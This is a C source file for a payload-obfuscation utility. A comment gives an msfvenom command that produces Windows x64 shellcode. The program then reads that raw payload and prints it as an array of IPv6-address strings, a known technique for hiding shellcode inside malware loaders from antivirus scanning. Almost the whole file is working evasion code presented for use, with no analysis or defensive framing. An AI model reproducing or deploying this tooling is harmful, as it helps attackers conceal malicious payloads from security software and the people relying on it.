#include <Windows.h>
#include <stdio.h>
#include <ip2string.h>
#include <In6addr.h>

// this header is full of errors
//#include <Ws2ipdef.h>
#define INET6_ADDRSTRLEN 65

// first generated a payload padded to % 16 == 0 with
// .\msfvenom.bat -p windows/x64/exec CMD=calc.exe -f raw --pad-nops -n 288

VOID GenerateIPv6(BYTE*, DWORD);

INT main(INT argc, PSTR* argv) {
	HANDLE file = INVALID_HANDLE_VALUE;
	DWORD file_size;
	DWORD buff_size;
	BYTE* payload_buff = NULL; 
	BYTE* pbuff = NULL;
	CHAR ipv6_str[INET6_ADDRSTRLEN];

	if (argc != 2) {
		return 1;
	}
	
	file = CreateFileA(
		argv[1],
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (file == INVALID_HANDLE_VALUE) {
		return 2;
	}

	file_size = GetFileSize(file, NULL);

	if (file_size % 16 == 0) {
		buff_size = file_size;
	}
	else {
		//pad buffer size to 16 bytes
		buff_size = file_size + 16 - (file_size % 16);
	}

	payload_buff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buff_size);

	ReadFile(file, payload_buff, buff_size, NULL, NULL);

	CloseHandle(file);
	file = INVALID_HANDLE_VALUE;

	pbuff = payload_buff;

	puts("PCSTR ipv6_payload[] = {");

	while (pbuff < payload_buff + buff_size) {
		RtlIpv6AddressToStringA((IN6_ADDR*)pbuff, (PSTR)&ipv6_str);
		/*
		printf("\t\"%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X:%0.2X%0.2X\",\n",
			pbuff[0],
			pbuff[1],
			pbuff[2],
			pbuff[3],
			pbuff[4],
			pbuff[5],
			pbuff[6],
			pbuff[7],
			pbuff[8],
			pbuff[9],
			pbuff[10],
			pbuff[11],
			pbuff[12],
			pbuff[13],
			pbuff[14],
			pbuff[15]
		);
		*/
		printf("\t\"%s\",\n", ipv6_str);
		pbuff += sizeof(IN6_ADDR);
	}

	puts("};");

	HeapFree(GetProcessHeap(), 0, payload_buff);
	
	return 0;
}